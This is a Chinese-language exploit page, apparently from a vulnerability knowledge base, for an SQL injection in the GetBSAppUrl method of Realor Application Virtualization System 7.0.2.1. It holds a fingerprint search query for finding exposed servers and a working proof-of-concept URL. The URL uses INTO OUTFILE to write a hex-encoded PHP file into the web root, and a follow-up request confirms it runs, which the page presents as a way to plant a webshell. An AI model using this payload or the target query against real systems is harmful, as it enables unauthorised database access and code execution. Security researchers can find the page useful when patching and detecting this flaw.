# 瑞友 应用虚拟化系统 GetBSAppUrl SQL注入漏洞

## 漏洞描述

瑞友 应用虚拟化系统 GetBSAppUrl方法存在SQL注入漏洞，由于参数传入没有进行过滤导致存在SQL注入，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>瑞友应用虚拟化系统 7.0.2.1</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"CASMain.XGI?cmd=GetDirApp" && title=="瑞友应用虚拟化系统"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1681181309572-a70542e4-5ec8-4441-bf73-d097a59be7d5.png)



在 GetBSAppUrl 方法中存在SQL注入漏洞，通过漏洞可以写入Webshell文件

![img](../../../.vuepress/public/img/1681187680384-430aaff0-d568-4144-ac8b-bd2ff471e2b3.png)

验证POC

```plain
/index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f70687020706870696e666f28293b3f3e+into+outfile+%27C%3a\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\test7.php%27%23/123
```

![img](../../../.vuepress/public/img/1681188074734-58253667-cdba-4a7e-88ad-87e0d63658cb.png)

```plain
/test7.php
```

![img](../../../.vuepress/public/img/1681181764154-3a7a73d8-20a2-4a11-b837-ac9d0363955b.png)